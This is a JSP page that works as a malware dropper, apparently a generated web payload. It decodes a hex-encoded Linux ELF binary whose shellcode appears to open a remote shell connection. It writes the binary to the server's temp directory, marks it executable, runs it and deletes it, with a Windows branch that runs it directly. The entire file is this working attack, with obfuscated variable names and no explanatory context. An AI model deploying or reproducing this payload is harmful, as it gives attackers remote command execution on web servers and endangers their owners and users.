<%@ page import="java.io.*" %>
<%
  String jXZHMVKuByRwr = "7f454c460101010000000000000000000200030001000000548004083400000000000000000000003400200001000000000000000100000000000000008004080080040898000000dc000000070000000010000031dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a0a0f88680200232989e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80";
  String DMUzhyzlx = System.getProperty("java.io.tmpdir") + "/fvOskmiiAG";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    DMUzhyzlx = DMUzhyzlx.concat(".exe");
  }

  int eIfZUWgdbRaJp = jXZHMVKuByRwr.length();
  byte[] KJDqwcDJkal = new byte[eIfZUWgdbRaJp/2];
  for (int rRrRQoEYN = 0; rRrRQoEYN < eIfZUWgdbRaJp; rRrRQoEYN += 2) {
    KJDqwcDJkal[rRrRQoEYN / 2] = (byte) ((Character.digit(jXZHMVKuByRwr.charAt(rRrRQoEYN), 16) << 4)
                                              + Character.digit(jXZHMVKuByRwr.charAt(rRrRQoEYN+1), 16));
  }

  FileOutputStream dkCQrHRpwggj = new FileOutputStream(DMUzhyzlx);
  dkCQrHRpwggj.write(KJDqwcDJkal);
  dkCQrHRpwggj.flush();
  dkCQrHRpwggj.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] dOgBFPociJT = new String[3];
    dOgBFPociJT[0] = "chmod";
    dOgBFPociJT[1] = "+x";
    dOgBFPociJT[2] = DMUzhyzlx;
    Process yRffzLyFny = Runtime.getRuntime().exec(dOgBFPociJT);
    if (yRffzLyFny.waitFor() == 0) {
      yRffzLyFny = Runtime.getRuntime().exec(DMUzhyzlx);
    }

    File WNcsmMEOUhCBqd = new File(DMUzhyzlx); WNcsmMEOUhCBqd.delete();
  } else {
    String[] OcZnHOANbK = new String[1];
    OcZnHOANbK[0] = DMUzhyzlx;
    Process yRffzLyFny = Runtime.getRuntime().exec(OcZnHOANbK);
  }
%>
